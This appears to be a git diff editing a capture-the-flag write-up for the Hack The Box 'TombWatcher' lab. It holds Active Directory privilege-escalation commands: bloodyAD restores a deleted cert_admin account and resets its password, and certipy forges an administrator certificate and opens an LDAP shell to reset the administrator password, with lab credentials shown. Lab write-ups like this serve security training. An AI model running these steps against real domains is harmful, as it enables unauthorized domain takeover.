@@ -1083,14 +1083,10 @@ permission: CREATE_CHILD
 
 ### Exploitation
 
-Step-by-step privilege escalation.
-```
- bloodyAD --host tombwatcher.htb --dns 10.129.144.23 -d tombwatcher.htb -u john -p 'newP@ssword2022' set restore "CN=cert_admin\0ADEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3,CN=Deleted Objects,DC=tombwatcher,DC=htb"
-[+] CN=cert_admin\0ADEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3,CN=Deleted Objects,DC=tombwatcher,DC=htb has been restored successfully under CN=cert_admin,OU=ADCS,DC=tombwatcher,DC=htb
-
-```
+The `cert_admin` certificate will be used for forging a new certificate as administrator
 
 
+Searching for the `cert_admin` with the correct SID:
 ```
  bloodyAD --host tombwatcher.htb --dns 10.129.144.23 -d tombwatcher.htb -u john -p 'newP@ssword2022' get object "CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb"
 
@@ -1126,44 +1122,21 @@ uSNCreated: 13186
 userAccountControl: NORMAL_ACCOUNT; DONT_EXPIRE_PASSWORD
 whenChanged: 2024-11-16 17:07:27+00:00
 whenCreated: 2024-11-16 17:07:04+00:00
-                                                                                                                                                                                                                                    
-┌──(kali㉿kali)-[~/bloodhound-ce]
-└─$ bloodyAD --host tombwatcher.htb --dns 10.129.144.23 -d tombwatcher.htb -u john -p 'newP@ssword2022' remove object "CN=cert_admin,OU=ADCS,DC=tombwatcher,DC=htb"
-[+] CN=cert_admin,OU=ADCS,DC=tombwatcher,DC=htb has been removed
-                                                                                                                                                                                                                                    
+```
+
+Restoring the object:
+```                                                                                                                                                               
 ┌──(kali㉿kali)-[~/bloodhound-ce]
 └─$ bloodyAD --host tombwatcher.htb --dns 10.129.144.23 -d tombwatcher.htb -u john -p 'newP@ssword2022' set restore "CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb"
 [+] CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb has been restored successfully under CN=cert_admin,OU=ADCS,DC=tombwatcher,DC=htb
-                                                                                                                                                                                                                                    
+                                                                            
+
+Setting an arbitrary password:                                                                                                                                           
 ┌──(kali㉿kali)-[~/bloodhound-ce]
 └─$ bloodyAD --host tombwatcher.htb --dns 10.129.144.23 -d tombwatcher.htb -u john -p 'newP@ssword2022' set password cert_admin 'Password123!'
 [+] Password changed successfully!
-                                                                                                                                                                                                                                    
-┌──(kali㉿kali)-[~/bloodhound-ce]
-└─$ certipy-ad req -u cert_admin -p 'Password123!' -dc-ip 10.129.144.23 \
-  -ca tombwatcher-CA-1 -template WebServer \
-  -upn administrator@tombwatcher.htb \
-  -application-policies "Client Authentication"
-Certipy v5.0.3 - by Oliver Lyak (ly4k)
-
-[*] Requesting certificate via RPC
-[-] Got error: The NETBIOS connection with the remote host timed out.
-[-] Use -debug to print a stacktrace
-                                                                                                                                                                                                                                    
-┌──(kali㉿kali)-[~/bloodhound-ce]
-└─$ ping 10.129.144.23
-PING 10.129.144.23 (10.129.144.23) 56(84) bytes of data.
-64 bytes from 10.129.144.23: icmp_seq=1 ttl=127 time=43.3 ms
-64 bytes from 10.129.144.23: icmp_seq=2 ttl=127 time=42.1 ms
-^V64 bytes from 10.129.144.23: icmp_seq=3 ttl=127 time=43.7 ms
-64 bytes from 10.129.144.23: icmp_seq=4 ttl=127 time=43.3 ms
-64 bytes from 10.129.144.23: icmp_seq=5 ttl=127 time=46.1 ms
-^V64 bytes from 10.129.144.23: icmp_seq=6 ttl=127 time=78.2 ms
-^C
---- 10.129.144.23 ping statistics ---
-6 packets transmitted, 6 received, 0% packet loss, time 5004ms
-rtt min/avg/max/mdev = 42.095/49.456/78.185/12.904 ms
-                                                                                                                                                                                                                                    
+                                                                                                                                                                
+requesting a certificate works but doesnt disclose the hash:                                                                                                                                                                                                                                         
 ┌──(kali㉿kali)-[~/bloodhound-ce]
 └─$ certipy-ad req -u cert_admin -p 'Password123!' -dc-ip 10.129.144.23 \
   -ca tombwatcher-CA-1 -template WebServer \
@@ -1205,7 +1178,8 @@ Certipy v5.0.3 - by Oliver Lyak (ly4k)
 [-] Check the certificate template and ensure it has the correct EKU(s)
 [-] If you recently changed the certificate template, wait a few minutes for the change to propagate
 [-] See the wiki for more information
-                                                                                                                
+
+However LDAP access is granted and used to reset the administrator password, consequentely granting winrm access with full privileges:                                                                                                                
 ┌──(kali㉿kali)-[~/bloodhound-ce]
 └─$ certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.144.23 -ldap-shell
 Certipy v5.0.3 - by Oliver Lyak (ly4k)
